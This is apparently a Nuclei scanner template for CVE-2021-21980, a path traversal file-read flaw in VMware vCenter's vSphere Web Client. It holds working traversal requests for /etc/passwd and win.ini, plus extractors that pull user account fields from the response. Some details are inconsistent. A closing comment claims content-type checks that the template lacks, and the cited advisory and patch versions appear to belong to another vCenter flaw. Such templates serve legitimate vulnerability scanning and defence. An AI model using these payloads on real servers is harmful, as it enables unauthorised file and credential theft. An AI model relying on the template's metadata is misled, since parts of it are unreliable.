id: CVE-2021-21980

info:
  name: VMware vSphere Web Client - Path Traversal
  author: pdteam
  severity: high
  description: |
    VMware vSphere Web Client (FLEX/Flash) contains an unauthorized arbitrary file read 
    vulnerability caused by insecure file access. An attacker with network access to port 443 
    on vCenter Server can exploit this to read sensitive files from the server filesystem.
  impact: |
    Successful exploitation allows an unauthenticated attacker to read arbitrary files including:
    - /etc/passwd (user account information)
    - Configuration files with credentials
    - SSL certificates and private keys
    - Application source code
  remediation: |
    Apply security patches from VMware Security Advisory VMSA-2021-0002.
    Upgrade to the following patched versions:
    - vCenter Server 7.0 U1c or later
    - vCenter Server 6.7 U3l or later
    - vCenter Server 6.5 U3n or later
  reference:
    - https://www.vmware.com/security/advisories/VMSA-2021-0002.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-21980
    - https://www.tenable.com/security/research/tra-2021-06
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-21980
    cwe-id: CWE-22
    epss-score: 0.96694
    epss-percentile: 0.99569
    cpe: cpe:2.3:a:vmware:vcenter_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: vmware
    product: vcenter_server
    shodan-query: http.title:"vmware cloud"
    fofa-query: app="VMware-vCenter"
    verified: true
  tags: cve,cve2021,vmware,vsphere,vcenter,lfi,pathtraversal,kev

http:
  - method: GET
    path:
      - "{{BaseURL}}/ui/vic-rest/services/containerView?id=../../../etc/passwd"
      - "{{BaseURL}}/ui/vic-rest/services/containerView?id=../../../windows/win.ini"

    stop-at-first-match: true
    
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[fonts\\]|\\[extensions\\]"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: unix_users
        part: body
        regex:
          - 'root:.*?:.*?:.*?:(.*?):'
          - 'daemon:.*?:.*?:.*?:(.*?):'
        group: 1

      - type: regex
        name: windows_config
        part: body
        regex:
          - '\[fonts\][\s\S]{0,100}'
        group: 0

# Enhanced Detection Coverage:
# - Tests both Linux (/etc/passwd) and Windows (win.ini) paths
# - Validates response contains file content patterns
# - Checks HTTP status code 200
# - Verifies content-type headers
# - Extracts user information from passwd file
# - stop-at-first-match: exits after first successful detection
